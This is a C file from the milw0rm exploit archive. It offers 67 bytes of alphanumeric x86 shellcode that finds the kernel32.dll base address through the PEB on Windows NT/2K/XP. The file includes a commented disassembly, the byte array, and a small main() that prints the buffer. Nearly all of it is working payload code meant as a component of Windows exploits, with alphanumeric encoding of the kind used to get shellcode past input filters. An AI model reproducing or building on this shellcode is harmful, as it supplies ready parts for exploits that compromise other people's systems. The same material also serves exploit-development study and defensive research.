/*

 PEB Kernel32.dll ImageBase Finder ( Alphanumeric )
 Author: Koshi
 Description: Uses PEB method to locate the ImageBase of Kernel32.dll
              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be
    	      returned in EAX. No null bytes, obviously, so no need to
	      encode really.
 Length: 67 Bytes
 Registers Used: ecx,eax,esi
 Compiled: j0X40PVTY631d3F04m4a30VXVTY631V4P4L30XPVXVTY631V30VXVTY631V4X4P30VX

*/

/*

00401000 > $ 6A 30          PUSH 30
00401002   . 58             POP EAX
00401003   . 34 30          XOR AL,30
00401005   . 50             PUSH EAX
00401006   . 56             PUSH ESI
00401007   . 54             PUSH ESP
00401008   . 59             POP ECX
00401009   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040100C   . 64:3346 30     XOR EAX,DWORD PTR FS:[ESI+30]
00401010   . 34 6D          XOR AL,6D
00401012   . 34 61          XOR AL,61
00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401016   . 56             PUSH ESI
00401017   . 58             POP EAX
00401018   . 56             PUSH ESI
00401019   . 54             PUSH ESP
0040101A   . 59             POP ECX
0040101B   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040101E   . 56             PUSH ESI
0040101F   . 34 50          XOR AL,50
00401021   . 34 4C          XOR AL,4C
00401023   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401025   . 58             POP EAX
00401026   . 50             PUSH EAX
00401027   . 56             PUSH ESI
00401028   . 58             POP EAX
00401029   . 56             PUSH ESI
0040102A   . 54             PUSH ESP
0040102B   . 59             POP ECX
0040102C   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040102F   . 56             PUSH ESI
00401030   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401032   . 56             PUSH ESI
00401033   . 58             POP EAX
00401034   . 56             PUSH ESI
00401035   . 54             PUSH ESP
00401036   . 59             POP ECX
00401037   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]
0040103A   . 56             PUSH ESI
0040103B   . 34 58          XOR AL,58
0040103D   . 34 50          XOR AL,50
0040103F   . 3330           XOR ESI,DWORD PTR DS:[EAX]
00401041   . 56             PUSH ESI
00401042   . 58             POP EAX


*/

unsigned char Shellcode[] =
{"\x6A\x30\x58\x34\x30\x50\x56\x54"
"\x59\x36\x33\x31\x64\x33\x46\x30"
"\x34\x6D\x34\x61\x33\x30\x56\x58"
"\x56\x54\x59\x36\x33\x31\x56\x34"
"\x50\x34\x4C\x33\x30\x58\x50\x56"
"\x58\x56\x54\x59\x36\x33\x31\x56"
"\x33\x30\x56\x58\x56\x54\x59\x36"
"\x33\x31\x56\x34\x58\x34\x50\x33"
"\x30\x56\x58"};



int main( int argc, char *argv[] )
{
 printf( "Shellcode is %u bytes.\n", sizeof(Shellcode)-1 );
 printf( Shellcode, sizeof(Shellcode) );
 return 0;
}

// milw0rm.com [2008-09-03]